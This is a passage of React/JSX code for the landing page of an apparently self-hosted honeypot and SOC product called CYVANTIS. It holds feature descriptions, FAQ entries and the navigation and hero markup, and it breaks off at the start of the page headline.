        'Analyzes raw command strings captured by Cowrie honeypots in real time.',
        'Uses Isolation Forest and Autoencoders to calculate anomaly probabilities against baseline administrative command patterns.',
        'Scores threats on a 1-100 scale: Low (1-30), Medium (31-60), High (61-85), Critical (86-100).',
        'Elevates high-risk alerts for automated incident playbook triggering.'
      ],
      workflow: [
        '1. Raw command string received via ingestion endpoint (/api/v1/events).',
        '2. Command text sanitized, tokenized, and vector-mapped.',
        '3. Heuristic regex rules check for known weaponization patterns.',
        '4. Unsupervised ML model calculates reconstruction loss & anomaly score.',
        '5. Severity rating persisted to database & broadcast to connected SOC analysts.'
      ],
      techStack: 'Scikit-Learn, IsolationForest, TF-IDF Vectorizer, FastAPI ML Router'
    },
    websocket: {
      title: 'WebSocket Telemetry Stream',
      category: 'Real-Time Telemetry Pipeline',
      badge: 'Latency: < 12ms',
      icon: <Activity className="w-6 h-6 text-emerald-400" />,
      summary: 'Pushes live attack events instantly to the SOC dashboard using sub-15ms WebSocket channels for immediate security operator awareness.',
      howItIsUsed: [
        'Establishes persistent bidirectional WebSocket connections (ws://localhost:8000/ws/events).',
        'Streams live attack attempts to all active SOC analyst browser sessions simultaneously.',
        'Eliminates HTTP polling overhead, delivering updates with sub-12ms latency.',
        'Includes auto-reconnect fallback with exponential backoff.'
      ],
      workflow: [
        '1. Frontend mounts WebSocket listener upon SOC Admin login.',
        '2. Ingestion pipeline receives new Cowrie event log.',
        '3. ConnectionManager broadcasts JSON event payload to all connected clients.',
        '4. React UI updates live incident feed with flashing severity badge.'
      ],
      techStack: 'FastAPI WebSocket Endpoint, asyncio Broadcast Channel, React WebSocket Hook'
    },
    security2fa: {
      title: 'Enforced 2FA & Account Lockout',
      category: 'Access Hardening & Authentication',
      badge: 'Security: TOTP / AES-256',
      icon: <LockKeyhole className="w-6 h-6 text-indigo-400" />,
      summary: 'Hardens SOC gateway access with mandatory TOTP 2-Factor Authentication (Google Authenticator), auto 15-minute idle lock, and 5-failed attempt lockout rules.',
      howItIsUsed: [
        'Enforces mandatory default password replacement upon first admin login.',
        'Generates local Base64 QR codes (data:image/png;base64,...) for 100% offline Google Authenticator setup.',
        'Tracks failed login attempts: 5 failed tries automatically trigger a 15-minute account lockout.',
        'Monitors user inactivity: locks UI after 15 minutes of idle time.'
      ],
      workflow: [
        '1. User logs in with primary credentials.',
        '2. If 2FA enabled, backend requests 6-digit TOTP token.',
        '3. PyOTP validates TOTP window (time-step 30s).',
        '4. If 5 consecutive failures occur, account status updated to locked until expiry.',
        '5. JWT Access Token issued upon full validation.'
      ],
      techStack: 'PyOTP (RFC 6238 TOTP), Python qrcode + Pillow, Passlib bcrypt, JWT Bearer Tokens'
    },
    backup: {
      title: 'SQLite WAL Online Backups',
      category: 'Data Protection & Integrity',
      badge: 'Mode: WAL Journaling',
      icon: <Database className="w-6 h-6 text-teal-400" />,
      summary: 'Performs hot zero-downtime database snapshots using Write-Ahead Logging (WAL) mode, guaranteeing forensic record integrity across system reboots.',
      howItIsUsed: [
        'Configures SQLite database with Write-Ahead Logging (PRAGMA journal_mode=WAL).',
        'Allows concurrent readers and writers without database locking during active attack bursts.',
        'Generates timestamped hot backup copies (.db.bak) on demand or via scheduler.',
        'Runs automated SQLite integrity checks (PRAGMA integrity_check) after snapshot creation.'
      ],
      workflow: [
        '1. Admin clicks "Create Backup" in SOC Control Panel.',
        '2. Backend invokes SQLite VACUUM INTO or backup API.',
        '3. Timestamped file created in backend/backups/cyvantis_backup_YYYYMMDD.db.',
        '4. Integrity check verified; backup record saved to audit table.'
      ],
      techStack: 'SQLite3 WAL Journaling, SQLAlchemy 2.0, Python shutil / sqlite3 backup API'
    },
    pdf: {
      title: 'Executive PDF Reporting',
      category: 'Audit & Compliance Reporting',
      badge: 'Format: Automated PDF',
      icon: <FileText className="w-6 h-6 text-cyan-400" />,
      summary: 'Generates audit-ready executive PDF threat reports complete with GeoIP breakdown charts, top attacker IP tables, and incident remediation recommendations.',
      howItIsUsed: [
        'Summarizes recorded honeypot events over customizable date ranges.',
        'Aggregates key metrics: total attacks, top origin countries, severity breakdown, and most targeted decoy ports.',
        'Formats executive whitepaper PDF with official CYVANTIS branding.',
        'Includes MITRE ATT&CK recommendations for incident response teams.'
      ],
      workflow: [
        '1. Analyst opens Reports section in SOC Admin Panel.',
        '2. Selects date range filter & clicks "Generate Executive PDF".',
        '3. Backend query fetches telemetry analytics & compiles executive summary.',
        '4. File generated and served for instant browser download.'
      ],
      techStack: 'Python ReportLab / Dynamic Document Generator, HTML5 Canvas PDF Exporter'
    }
  };

  // FAQ Items
  const faqs = [
    {
      q: 'Can CYVANTIS be self-hosted on private cloud or on-premise infrastructure?',
      a: 'Yes, CYVANTIS is designed to be fully self-hostable via Docker Compose or Kubernetes manifests. You retain 100% control over all decoy logs and zero data ever leaves your network perimeter.'
    },
    {
      q: 'How does Cowrie deception prevent honeypot escaping or host kernel compromise?',
      a: 'Cowrie operates as a medium-interaction user-space honeypot inside an isolated Python/Twisted chroot jail or Docker container. It emulates Linux shell commands without granting actual root system calls to the underlying host OS.'
    },
    {
      q: 'What machine learning algorithms are used for AI Anomaly Detection?',
      a: 'CYVANTIS combines TF-IDF command tokenization with Isolation Forest unsupervised anomaly detection and heuristic regex pattern matching to grade threat severity from 1 to 100 in real time.'
    },
    {
      q: 'Does CYVANTIS support SIEM & SOAR integrations?',
      a: 'Yes! CYVANTIS streams structured JSON events over WebSockets, Syslog (RFC 5424), and Webhooks for instant ingest into Splunk, Elastic SIEM, Microsoft Sentinel, and QRadar.'
    },
    {
      q: 'How does 2FA TOTP authentication work during offline deployment?',
      a: 'CYVANTIS generates PyOTP secret keys and converts QR codes into inline Base64 PNG data URLs locally in Python. It does not call any third-party external APIs, guaranteeing 100% offline TOTP setup.'
    }
  ];

  return (
    <div className={`landing-page-root min-h-screen ${theme === 'light' ? 'bg-[#F4F6F9] text-[#0E1A1F]' : (isDarkOps ? 'bg-[#000000] text-slate-100' : 'bg-[#030612] text-slate-100')} font-sans selection:bg-[#00d2ff] selection:text-black relative overflow-x-hidden ${showCookieBanner ? 'pb-36' : ''} ${fontScale === 'large' ? 'text-base' : fontScale === 'small' ? 'text-xs' : 'text-sm'}`}>

      {/* Skip-to-content Link (Feature 10) */}
      <a
        href="#main-content"
        className="sr-only focus:not-sr-only focus:absolute focus:top-4 focus:left-4 focus:z-[250] focus:px-4 focus:py-2 focus:bg-[#00d2ff] focus:text-black focus:font-bold focus:rounded-lg"
      >
        Skip to main content
      </a>

      {/* ARIA Live Region */}
      <div aria-live="polite" className="sr-only">
        {announcedEvent}
      </div>

      {/* Ambient Data Flow Watermark */}
      <div className="absolute top-28 left-1/4 text-[120px] lg:text-[180px] font-black text-slate-800/10 pointer-events-none select-none font-mono tracking-tighter z-0">
        8.4 TB/S
      </div>

      {/* Cyber Grid & Ambient Glows */}
      {!reduceMotion && !isDarkOps && (
        <div
          className="absolute inset-0 opacity-20 pointer-events-none z-0"
          style={{
            backgroundImage: `radial-gradient(circle at 60% 25%, rgba(0, 210, 255, 0.25) 0%, transparent 65%),
                              radial-gradient(circle at 20% 70%, rgba(255, 107, 53, 0.15) 0%, transparent 50%),
                              linear-gradient(to right, rgba(30, 41, 59, 0.35) 1px, transparent 1px),
                              linear-gradient(to bottom, rgba(30, 41, 59, 0.35) 1px, transparent 1px)`,
            backgroundSize: '100% 100%, 100% 100%, 45px 45px, 45px 45px'
          }}
        />
      )}

      {/* Floating Global Toast Notification */}
      {toastMessage && (
        <div className="fixed top-20 right-6 z-[220] bg-[#050b1f] border border-[#00d2ff]/60 px-4 py-3 rounded-2xl shadow-[0_0_30px_rgba(0,210,255,0.4)] flex items-center gap-3 text-white font-mono text-xs animate-in slide-in-from-top-4 duration-200">
          <div className="w-2 h-2 rounded-full bg-[#00d2ff] animate-ping" />
          <span>{toastMessage}</span>
          <button onClick={() => setToastMessage(null)} className="text-slate-400 hover:text-white ml-2">✕</button>
        </div>
      )}

      {/* Floating Cyber Tech Navigation Island */}
      <div className="sticky top-3 sm:top-5 z-50 px-3 sm:px-6 lg:px-8 max-w-7xl mx-auto w-full transition-all duration-300">
        <nav className="floating-tech-nav px-3 sm:px-5 py-2 relative transition-all duration-300 shadow-[0_20px_50px_rgba(0,0,0,0.85),0_0_30px_rgba(105,103,251,0.22)]">
          {/* Cyber Tech Corner Accent Brackets */}
          <div className="tech-corner-tl" />
          <div className="tech-corner-tr" />
          <div className="tech-corner-bl" />
          <div className="tech-corner-br" />

          {/* Specular Top Edge Light */}
          <div className="absolute top-0 left-12 right-12 h-[1px] bg-gradient-to-r from-transparent via-[#C8F904]/40 to-transparent pointer-events-none" />

          <div className="flex items-center justify-between h-12 relative z-10 whitespace-nowrap">
            {/* Brand Logo & Name (Single Crisp Line) */}
            <div className="flex items-center gap-2.5 cursor-pointer select-none shrink-0" onClick={() => window.scrollTo({ top: 0, behavior: 'smooth' })}>
              <div className="w-8 h-8 rounded-lg bg-[#0E1A1F] p-1 border border-[#6967FB]/60 shadow-[0_0_12px_rgba(105,103,251,0.35)] flex items-center justify-center shrink-0">
                <img src="/cyvantis-logo.jpg" alt="CYVANTIS" className="w-full h-full object-cover rounded" />
              </div>
              <div className="flex items-center gap-1.5 whitespace-nowrap">
                <span className="text-base sm:text-lg font-black tracking-wider text-white font-mono">
                  CYVANTIS
                </span>
                <span className="hidden xl:inline-flex items-center gap-1 px-1.5 py-0.5 rounded bg-[#C8F904]/10 border border-[#C8F904]/30 text-[9px] font-mono font-bold text-[#C8F904]">
                  <span className="w-1.5 h-1.5 rounded-full bg-[#C8F904] animate-pulse" />
                  INTEL
                </span>
              </div>
            </div>

            {/* Desktop Navigation Links with Dropdowns (Single Line) */}
            <div className="hidden lg:flex items-center gap-1 xl:gap-2 text-xs font-mono text-[#9FB0B7] uppercase tracking-wider">
              {/* Home */}
              <a
                href="#about"
                className={`px-3 py-1.5 rounded-lg hover:text-[#C8F904] hover:bg-[#6967FB]/15 transition-colors ${activeSection === 'about' ? 'text-[#C8F904] font-bold bg-[#6967FB]/10 border-b border-[#C8F904]' : ''}`}
              >
                {lang === 'EN' ? 'HOME' : 'गृह'}
              </a>

              {/* Demo Video Showcase */}
              <a
                href="#showcase"
                className="px-3 py-1.5 rounded-lg hover:text-[#C8F904] hover:bg-[#6967FB]/15 transition-colors flex items-center gap-1.5 text-[#C8F904]"
              >
                <Play className="w-3 h-3 text-[#C8F904] fill-[#C8F904]" />
                <span>{lang === 'EN' ? 'SHOWCASE' : 'शोकेस'}</span>
              </a>

              {/* Platform Dropdown */}
              <div className="relative" ref={platformRef}>
                <button
                  type="button"
                  onClick={() => { setPlatformDropdownOpen(prev => !prev); setResourcesDropdownOpen(false); }}
                  onMouseEnter={() => { setPlatformDropdownOpen(true); setResourcesDropdownOpen(false); }}
                  className={`flex items-center gap-1 px-3 py-1.5 rounded-lg hover:text-[#C8F904] hover:bg-[#6967FB]/15 transition-colors ${platformDropdownOpen || activeSection === 'services' || activeSection === 'solutions' ? 'text-[#C8F904] font-bold bg-[#6967FB]/10' : ''}`}
                >
                  <span>{lang === 'EN' ? 'PLATFORM' : 'प्लेटफ़ॉर्म'}</span>
                  <ChevronDown className={`w-3.5 h-3.5 transition-transform duration-200 ${platformDropdownOpen ? 'rotate-180 text-[#C8F904]' : ''}`} />
                </button>

                {platformDropdownOpen && (
                  <div
                    onMouseLeave={() => setPlatformDropdownOpen(false)}
                    className="absolute top-full left-0 mt-2 w-64 bg-[#0E1A1F]/95 backdrop-blur-2xl border border-[#6967FB]/40 rounded-xl p-2 shadow-[0_20px_50px_rgba(0,0,0,0.9),0_0_25px_rgba(105,103,251,0.25)] z-50 animate-in fade-in slide-in-from-top-2 duration-150"
                  >
                    <a
                      href="#services"
                      onClick={() => setPlatformDropdownOpen(false)}
                      className="flex items-start gap-2.5 p-2 rounded-lg hover:bg-[#6967FB]/25 group transition"
                    >
                      <Shield className="w-4 h-4 text-[#C8F904] mt-0.5 shrink-0" />
                      <div>
                        <div className="text-xs font-bold text-white group-hover:text-[#C8F904]">{lang === 'EN' ? 'Services & Defense' : 'सेवाएं और सुरक्षा'}</div>
                        <div className="text-[10px] text-[#9FB0B7] normal-case">SOC, honeypots & threat response</div>
                      </div>
                    </a>

                    <a
                      href="#solutions"
                      onClick={() => setPlatformDropdownOpen(false)}
                      className="flex items-start gap-2.5 p-2 rounded-lg hover:bg-[#6967FB]/25 group transition"
                    >
                      <Layers className="w-4 h-4 text-[#6967FB] mt-0.5 shrink-0" />
                      <div>
                        <div className="text-xs font-bold text-white group-hover:text-[#C8F904]">{lang === 'EN' ? 'Enterprise Solutions' : 'समाधान'}</div>
                        <div className="text-[10px] text-[#9FB0B7] normal-case">Architecture, compliance & scale</div>
                      </div>
                    </a>

                    <button
                      type="button"
                      onClick={() => { setPlatformDropdownOpen(false); setIsPentestGuardrailsOpen(true); }}
                      className="w-full text-left flex items-start gap-2.5 p-2 rounded-lg hover:bg-[#6967FB]/25 group transition"
                    >
                      <Terminal className="w-4 h-4 text-[#C8F904] mt-0.5 shrink-0" />
                      <div>
                        <div className="text-xs font-bold text-white group-hover:text-[#C8F904] flex items-center gap-1.5">
                          <span>Guardrails Lab</span>
                          <span className="px-1 py-0.2 rounded bg-[#C8F904]/20 text-[9px] text-[#C8F904]">Sandbox</span>
                        </div>
                        <div className="text-[10px] text-[#9FB0B7] normal-case">Scope boundaries & pentest rules</div>
                      </div>
                    </button>

                    <button
                      type="button"
                      onClick={() => { setPlatformDropdownOpen(false); setIsAdvancedPentestOpen(true); }}
                      className="w-full text-left flex items-start gap-2.5 p-2 rounded-lg hover:bg-[#6967FB]/25 group transition"
                    >
                      <Target className="w-4 h-4 text-[#6967FB] mt-0.5 shrink-0" />
                      <div>
                        <div className="text-xs font-bold text-white group-hover:text-[#C8F904]">Advanced Pentest Suite</div>
                        <div className="text-[10px] text-[#9FB0B7] normal-case">AI vulnerability testing engine</div>
                      </div>
                    </button>

                    <button
                      type="button"
                      onClick={() => { setPlatformDropdownOpen(false); setIsCyberWarRoomOpen(true); }}
                      className="w-full text-left flex items-start gap-2.5 p-2 rounded-lg hover:bg-[#6967FB]/25 group transition"
                    >
                      <Activity className="w-4 h-4 text-[#C8F904] mt-0.5 shrink-0" />
                      <div>
                        <div className="text-xs font-bold text-white group-hover:text-[#C8F904]">Cyber War Room</div>
                        <div className="text-[10px] text-[#9FB0B7] normal-case">Real-time incident response hub</div>
                      </div>
                    </button>
                  </div>
                )}
              </div>

              {/* Resources Dropdown */}
              <div className="relative" ref={resourcesRef}>
                <button
                  type="button"
                  onClick={() => { setResourcesDropdownOpen(prev => !prev); setPlatformDropdownOpen(false); }}
                  onMouseEnter={() => { setResourcesDropdownOpen(true); setPlatformDropdownOpen(false); }}
                  className={`flex items-center gap-1 px-3 py-1.5 rounded-lg hover:text-[#C8F904] hover:bg-[#6967FB]/15 transition-colors ${resourcesDropdownOpen || activeSection === 'resources' || activeSection === 'getting-started' ? 'text-[#C8F904] font-bold bg-[#6967FB]/10' : ''}`}
                >
                  <span>{lang === 'EN' ? 'RESOURCES' : 'संसाधन'}</span>
                  <ChevronDown className={`w-3.5 h-3.5 transition-transform duration-200 ${resourcesDropdownOpen ? 'rotate-180 text-[#C8F904]' : ''}`} />
                </button>

                {resourcesDropdownOpen && (
                  <div
                    onMouseLeave={() => setResourcesDropdownOpen(false)}
                    className="absolute top-full left-0 mt-2 w-64 bg-[#0E1A1F]/95 backdrop-blur-2xl border border-[#6967FB]/40 rounded-xl p-2 shadow-[0_20px_50px_rgba(0,0,0,0.9),0_0_25px_rgba(105,103,251,0.25)] z-50 animate-in fade-in slide-in-from-top-2 duration-150"
                  >
                    <a
                      href="#getting-started"
                      onClick={() => setResourcesDropdownOpen(false)}
                      className="flex items-start gap-2.5 p-2 rounded-lg hover:bg-[#6967FB]/25 group transition"
                    >
                      <Zap className="w-4 h-4 text-[#C8F904] mt-0.5 shrink-0" />
                      <div>
                        <div className="text-xs font-bold text-white group-hover:text-[#C8F904]">{lang === 'EN' ? 'Getting Started' : 'शुरू करें'}</div>
                        <div className="text-[10px] text-[#9FB0B7] normal-case">Fast deployment & onboarding</div>
                      </div>
                    </a>

                    <a
                      href="#faq"
                      onClick={() => setResourcesDropdownOpen(false)}
                      className="flex items-start gap-2.5 p-2 rounded-lg hover:bg-[#6967FB]/25 group transition"
                    >
                      <HelpCircle className="w-4 h-4 text-[#6967FB] mt-0.5 shrink-0" />
                      <div>
                        <div className="text-xs font-bold text-white group-hover:text-[#C8F904]">FAQ & Documentation</div>
                        <div className="text-[10px] text-[#9FB0B7] normal-case">Answers & technical guides</div>
                      </div>
                    </a>

                    <button
                      type="button"
                      onClick={() => { setResourcesDropdownOpen(false); setIsScorecardOpen(true); }}
                      className="w-full text-left flex items-start gap-2.5 p-2 rounded-lg hover:bg-[#6967FB]/25 group transition"
                    >
                      <Trophy className="w-4 h-4 text-[#C8F904] mt-0.5 shrink-0" />
                      <div>
                        <div className="text-xs font-bold text-white group-hover:text-[#C8F904]">Security Scorecard</div>
                        <div className="text-[10px] text-[#9FB0B7] normal-case">Benchmark posture & risks</div>
                      </div>
                    </button>

                    <button
                      type="button"
                      onClick={() => { setResourcesDropdownOpen(false); setIsApiKeyManagerOpen(true); }}
                      className="w-full text-left flex items-start gap-2.5 p-2 rounded-lg hover:bg-[#6967FB]/25 group transition"
                    >
                      <KeyRound className="w-4 h-4 text-[#6967FB] mt-0.5 shrink-0" />
                      <div>
                        <div className="text-xs font-bold text-white group-hover:text-[#C8F904]">API Keys & Access</div>
                        <div className="text-[10px] text-[#9FB0B7] normal-case">Integrate with your SIEM</div>
                      </div>
                    </button>

                    <button
                      type="button"
                      onClick={() => { setResourcesDropdownOpen(false); setIsOnboardingTourOpen(true); }}
                      className="w-full text-left flex items-start gap-2.5 p-2 rounded-lg hover:bg-[#6967FB]/25 group transition"
                    >
                      <Play className="w-4 h-4 text-[#C8F904] mt-0.5 shrink-0" />
                      <div>
                        <div className="text-xs font-bold text-white group-hover:text-[#C8F904]">Guided System Tour</div>
                        <div className="text-[10px] text-[#9FB0B7] normal-case">1-minute walkthrough</div>
                      </div>
                    </button>
                  </div>
                )}
              </div>

              {/* Direct FAQ Link */}
              <a
                href="#faq"
                className={`px-3 py-1.5 rounded-lg hover:text-[#C8F904] hover:bg-[#6967FB]/15 transition-colors ${activeSection === 'faq' ? 'text-[#C8F904] font-bold bg-[#6967FB]/10 border-b border-[#C8F904]' : ''}`}
              >
                FAQ
              </a>
            </div>

            {/* Header Action Tools (Strictly 1 Line, Zero Wrap) */}
            <div className="flex items-center gap-2 sm:gap-2.5 shrink-0">
              {/* Command Palette Trigger Button (Ctrl+K) */}
              <button
                type="button"
                onClick={() => setIsCommandPaletteOpen(true)}
                className="px-2.5 py-1.5 rounded-lg bg-[#0E1A1F] border border-[#6967FB]/40 hover:border-[#C8F904] text-white font-mono text-xs flex items-center gap-1.5 transition shrink-0"
                title="Open Command Palette (Ctrl+K)"
              >
                <Search className="w-3.5 h-3.5 text-[#C8F904]" />
                <span className="hidden xl:inline text-[#9FB0B7]">Commands</span>
                <kbd className="hidden sm:inline px-1 py-0.5 rounded bg-[#122026] border border-[#6967FB]/40 text-[9px] text-[#9FB0B7]">Ctrl+K</kbd>
              </button>

              {/* Notification Bell */}
              <button
                type="button"
                onClick={() => setIsNotificationCenterOpen(true)}
                className="p-1.5 sm:p-2 rounded-lg bg-[#0E1A1F] border border-[#6967FB]/35 text-white relative transition hover:border-[#C8F904] shrink-0"
                title="Alert Notifications"
                aria-label="Open Notifications Hub"
              >
                <Bell className="w-4 h-4 text-[#C8F904]" />
                <span className="absolute -top-1 -right-1 w-3.5 h-3.5 rounded-sm bg-[#6967FB] text-white font-mono text-[8px] font-bold flex items-center justify-center">
                  3
                </span>
              </button>

              {/* EN/HI Language Toggle */}
              <button
                type="button"
                onClick={() => setLang(prev => prev === 'EN' ? 'HI' : 'EN')}
                className="px-2 py-1.5 rounded-lg bg-[#0E1A1F] border border-[#6967FB]/35 text-xs font-mono font-bold text-[#C8F904] flex items-center gap-1 hover:bg-[#122026] shrink-0"
                title="Toggle Language (EN/HI)"
              >
                <Languages className="w-3.5 h-3.5" />
                <span>{lang}</span>
              </button>

              {/* Dark / White Mode Toggle Button (Admin Protected) */}
              <button
                type="button"
                onClick={handleThemeToggleClick}
                className={`px-2.5 py-1.5 rounded-lg border text-xs font-mono font-bold flex items-center gap-1.5 transition shrink-0 cursor-pointer ${theme === 'dark'
                  ? 'bg-[#0E1A1F] border-[#6967FB]/40 hover:border-[#C8F904] text-white'
                  : 'bg-white border-[#6967FB]/40 hover:border-[#6967FB] text-[#0E1A1F] shadow-sm'
                  }`}
                title={
                  isUserAdmin || isAdminVerified
                    ? `Visual Interface: ${theme === 'dark' ? 'Dark Mode' : 'White Mode'} (Admin Access Active - Click to Toggle)`
                    : `Visual Interface: ${theme === 'dark' ? 'Dark Mode' : 'White Mode'} (Admin Access Required)`
                }
                aria-label="Toggle Dark and White Color Mode"
              >
                {theme === 'dark' ? (
                  <Moon className="w-3.5 h-3.5 text-[#C8F904]" />
                ) : (
                  <Sun className="w-3.5 h-3.5 text-amber-500 fill-amber-400" />
                )}
                <span className="hidden sm:inline">
                  {theme === 'dark' ? 'Dark' : 'White'}
                </span>
                <span
                  className={`inline-flex items-center gap-0.5 px-1 py-0.5 rounded text-[8px] font-mono leading-none tracking-tight ${isUserAdmin || isAdminVerified
                    ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40'
                    : 'bg-amber-500/20 text-amber-400 border border-amber-500/40'
                    }`}
                  title={isUserAdmin || isAdminVerified ? 'Admin Authorized' : 'Admin Protected'}
                >
                  <Lock className="w-2.5 h-2.5" />
                  <span className="hidden xl:inline">
                    {isUserAdmin || isAdminVerified ? 'ADMIN' : 'LOCK'}
                  </span>
                </span>
              </button>

              {/* Console Login Button */}
              <button
                type="button"
                onClick={onLoginClick}
                className="hidden md:inline-flex btn-secondary py-1.5 px-3 text-xs font-mono whitespace-nowrap shrink-0"
              >
                LOGIN
              </button>

              {/* Primary CTA (Angular Squircle) */}
              <button
                type="button"
                onClick={() => setIsDemoModalOpen(true)}
                className="hidden sm:inline-flex btn-lime py-1.5 px-3.5 text-xs font-mono font-bold uppercase tracking-wider whitespace-nowrap shrink-0 items-center gap-1.5"
              >
                <span>{lang === 'EN' ? 'REQUEST DEMO' : 'डेमो बुक करें'}</span>
                <ArrowRight className="w-3.5 h-3.5" />
              </button>

              {/* Mobile Hamburger */}
              <button
                type="button"
                onClick={() => setIsMobileMenuOpen(prev => !prev)}
                className="lg:hidden p-2 rounded-lg bg-[#0E1A1F] border border-[#6967FB]/40 text-white shrink-0"
                aria-label="Toggle Navigation"
              >
                {isMobileMenuOpen ? <X className="w-5 h-5 text-[#C8F904]" /> : <Menu className="w-5 h-5" />}
              </button>
            </div>
          </div>

          {/* Mobile Slide-down Navigation (Chamfered Glass Dock) */}
          {isMobileMenuOpen && (
            <div className="lg:hidden mt-3 pt-3 border-t border-[#6967FB]/30 space-y-2 font-mono text-xs text-white bg-[#0E1A1F]/95 p-3 rounded-xl border border-[#6967FB]/40 shadow-2xl relative z-20">
              <a href="#about" onClick={() => setIsMobileMenuOpen(false)} className="block py-2 px-3 rounded-lg hover:bg-[#6967FB]/25 hover:text-[#C8F904]">HOME</a>
              <a href="#showcase" onClick={() => setIsMobileMenuOpen(false)} className="block py-2 px-3 rounded-lg hover:bg-[#6967FB]/25 hover:text-[#C8F904] flex items-center gap-2 text-[#C8F904]">
                <Play className="w-3 h-3 text-[#C8F904] fill-[#C8F904]" />
                <span>PLATFORM SHOWCASE (VIDEO)</span>
              </a>
              <a href="#services" onClick={() => setIsMobileMenuOpen(false)} className="block py-2 px-3 rounded-lg hover:bg-[#6967FB]/25 hover:text-[#C8F904]">SERVICES</a>
              <a href="#solutions" onClick={() => setIsMobileMenuOpen(false)} className="block py-2 px-3 rounded-lg hover:bg-[#6967FB]/25 hover:text-[#C8F904]">SOLUTIONS</a>
              <button
                type="button"
                onClick={() => { setIsMobileMenuOpen(false); setIsPentestGuardrailsOpen(true); }}
                className="w-full text-left py-2 px-3 rounded-lg hover:bg-[#6967FB]/25 hover:text-[#C8F904] flex items-center justify-between"
              >
                <span>GUARDRAILS LAB</span>
                <span className="text-[10px] text-[#C8F904] border border-[#C8F904]/40 px-1 rounded">SANDBOX</span>
              </button>
              <a href="#resources" onClick={() => setIsMobileMenuOpen(false)} className="block py-2 px-3 rounded-lg hover:bg-[#6967FB]/25 hover:text-[#C8F904]">RESOURCES</a>
              <a href="#faq" onClick={() => setIsMobileMenuOpen(false)} className="block py-2 px-3 rounded-lg hover:bg-[#6967FB]/25 hover:text-[#C8F904]">FAQ</a>
              <a href="#getting-started" onClick={() => setIsMobileMenuOpen(false)} className="block py-2 px-3 rounded-lg hover:bg-[#6967FB]/25 hover:text-[#C8F904]">GET STARTED</a>

              {/* Mobile Mode Toggle */}
              <button
                type="button"
                onClick={() => {
                  setIsMobileMenuOpen(false);
                  handleThemeToggleClick();
                }}
                className="w-full text-left py-2 px-3 rounded-lg hover:bg-[#6967FB]/25 flex items-center justify-between"
              >
                <div className="flex items-center gap-2">
                  {theme === 'dark' ? (
                    <Moon className="w-4 h-4 text-[#C8F904]" />
                  ) : (
                    <Sun className="w-4 h-4 text-amber-400" />
                  )}
                  <span>THEME: {theme === 'dark' ? 'DARK OPS' : 'WHITE / LIGHT'}</span>
                </div>
                <span
                  className={`text-[9px] px-1.5 py-0.5 rounded flex items-center gap-1 font-mono ${isUserAdmin || isAdminVerified
                    ? 'text-emerald-400 bg-emerald-500/20 border border-emerald-500/40'
                    : 'text-amber-400 bg-amber-500/20 border border-amber-500/40'
                    }`}
                >
                  <Lock className="w-2.5 h-2.5" />
                  {isUserAdmin || isAdminVerified ? 'ADMIN AUTHORIZED' : 'ADMIN ONLY'}
                </span>
              </button>

              <div className="pt-2.5 flex flex-col gap-2 border-t border-[#6967FB]/25">
                <button
                  type="button"
                  onClick={() => { setIsMobileMenuOpen(false); setIsDemoModalOpen(true); }}
                  className="w-full btn-lime py-2.5"
                >
                  REQUEST DEMO
                </button>
                <button
                  type="button"
                  onClick={() => { setIsMobileMenuOpen(false); onLoginClick(); }}
                  className="w-full btn-secondary py-2.5"
                >
                  SIGN IN TO CONSOLE
                </button>
              </div>
            </div>
          )}
        </nav>
      </div>

      <main id="main-content">
        {/* "What's New in v2.5" Dismissible Banner */}
        {showWhatsNew && (
          <div className="bg-[#0E1A1F]/90 backdrop-blur-md border-b border-[#6967FB]/25 px-6 py-2.5 text-xs font-mono text-white relative z-20 flex items-center justify-between">
            <div className="max-w-7xl mx-auto flex flex-wrap items-center gap-3">
              <span className="px-2.5 py-1 rounded-md bg-[#6967FB]/25 border border-[#C8F904]/40 text-[#C8F904] font-bold text-[10px]">
                CYVANTIS v2.5
              </span>
              <span className="text-[#9FB0B7]">
                Smart Filter Chips, Split-View Inspector, Attack Timeline Scrubber, and Command Palette (Ctrl+K) active.
              </span>
              <button
                onClick={() => setIsOnboardingTourOpen(true)}
                className="underline text-[#C8F904] hover:text-white font-bold text-[11px] ml-2"
              >
                Take 1-Min Tour →
              </button>
            </div>
            <button onClick={() => setShowWhatsNew(false)} className="text-[#9FB0B7] hover:text-white ml-4">✕</button>
          </div>
        )}

        {/* Hero Section with Generous Breathing Space & Bubble Plain Aura */}
        <header id="about" className="relative pt-16 pb-24 px-6 sm:px-8 max-w-7xl mx-auto z-10">
          {/* Bubble Plain Ambient Background Lights */}
          <div className="bubble-plain -top-20 right-10 w-96 h-96 bubble-indigo opacity-20" />
          <div className="bubble-plain top-40 left-10 w-96 h-96 bubble-lime opacity-15" />

          <div className="flex flex-wrap items-center gap-3 mb-8 text-xs font-mono relative z-10">
            <a
              href="#space-showcase"
              className="px-3.5 py-1.5 rounded-xl bg-[#C8F904]/15 border border-[#C8F904] text-[#C8F904] flex items-center gap-2 shadow-[0_0_20px_rgba(200,249,4,0.3)] hover:bg-[#C8F904]/25 transition font-black tracking-wide cursor-pointer"
            >
              <span className="w-2 h-2 rounded-full bg-[#C8F904] animate-ping shrink-0" />
              <span>MISSION SECTOR 01 // COWRIE-NEXUS-ALPHA</span>
            </a>

            <div className="px-3.5 py-1.5 rounded-xl bg-[#6967FB]/15 border border-[#6967FB]/40 text-white flex items-center gap-2">
              <span className="w-2 h-2 rounded-full bg-[#6967FB] animate-radar shrink-0" />
              <span>--cyvantis autonomous mode</span>
            </div>

            <div className="px-3.5 py-1.5 rounded-xl bg-[#0E1A1F]/90 border border-[#6967FB]/30 text-white flex items-center gap-1.5">
              <span className="w-2 h-2 rounded-full bg-[#C8F904]" />
              <span>WS FEED: {wsStatus} ({wsLatency}ms)</span>
            </div>

            <button
              onClick={() => setIsOnboardingTourOpen(true)}
              className="px-3.5 py-1.5 rounded-xl bg-[#6967FB]/15 border border-[#6967FB]/30 text-white hover:border-[#C8F904] flex items-center gap-1.5 transition"
            >
              <Sparkles className="w-3.5 h-3.5 text-[#C8F904]" />
              <span>Guided Tour</span>
            </button>

            <button
              onClick={() => setShowShortcutHelp(true)}
              className="px-3 py-1.5 rounded-xl bg-[#0E1A1F]/80 border border-[#6967FB]/30 text-[#9FB0B7] flex items-center gap-1 hover:text-white transition"
            >
              <Keyboard className="w-3.5 h-3.5 text-[#6967FB]" />
              <span>Keys: Press [?]</span>
            </button>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-12 gap-12 lg:gap-16 items-center relative z-10">
            <div className="lg:col-span-7 space-y-6 text-left">
              <h1 className="text-4xl sm:text-6xl lg:text-7xl font-black tracking-tight text-white leading-[1.08]">
